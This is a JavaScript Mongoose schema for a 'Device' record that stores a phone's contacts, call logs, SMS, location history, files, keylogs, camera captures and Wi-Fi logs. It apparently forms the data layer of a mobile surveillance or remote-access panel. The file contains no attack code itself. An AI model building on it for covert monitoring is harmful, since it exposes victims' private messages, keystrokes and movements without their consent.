const mongoose = require("mongoose");

const DeviceSchema = new mongoose.Schema({
  enrollToken: { type: String, unique: true, sparse: true },
  // Core device identity
  imei:       { type: String, default: "" },
  name:       { type: String, default: "Unknown Device" },
  phone:      { type: String, default: "" },
  email:      { type: String, default: "" },
  comments:   { type: String, default: "" },
  lastOnline: { type: String, default: "" },
  ip:         { type: String, default: "" },
  model:      { type: String, default: "" },
  os:         { type: String, default: "" },
  battery:    { type: String, default: "" },

  // Feature data arrays
  contacts: [
    {
      name:   { type: String, default: "" },
      number: { type: String, default: "" },
      email:  { type: String, default: "" }
    }
  ],

  callLogs: [
    {
      name:     { type: String, default: "" },
      number:   { type: String, default: "" },
      type:     { type: String, enum: ["incoming", "outgoing", "missed"], default: "incoming" },
      duration: { type: String, default: "0s" },
      date:     { type: String, default: "" }
    }
  ],

  sms: [
    {
      sender:  { type: String, default: "" },
      message: { type: String, default: "" },
      type:    { type: String, enum: ["inbox", "sent"], default: "inbox" },
      date:    { type: String, default: "" }
    }
  ],

  location: [
    {
      lat:     { type: String, default: "" },
      lng:     { type: String, default: "" },
      address: { type: String, default: "" },
      date:    { type: String, default: "" }
    }
  ],

  apps: [
    {
      name:        { type: String, default: "" },
      packageName: { type: String, default: "" },
      version:     { type: String, default: "" },
      installed:   { type: String, default: "" }
    }
  ],

  files: [
    {
      name:     { type: String, default: "" },
      path:     { type: String, default: "" },
      size:     { type: String, default: "" },
      modified: { type: String, default: "" }
    }
  ],

  keylogs: [
    {
      app:     { type: String, default: "" },
      text:    { type: String, default: "" },
      date:    { type: String, default: "" }
    }
  ],

  iplogs: [
    {
      ip:       { type: String, default: "" },
      network:  { type: String, default: "" },
      date:     { type: String, default: "" }
    }
  ],

  camera: [
    {
      filename: { type: String, default: "" },
      url:      { type: String, default: "" },
      date:     { type: String, default: "" }
    }
  ],

  wifiLogs: [
    {
      ssid:    { type: String, default: "" },
      bssid:   { type: String, default: "" },
      signal:  { type: String, default: "" },
      date:    { type: String, default: "" }
    }
  ]

}, { timestamps: true });

module.exports = mongoose.model("Device", DeviceSchema);
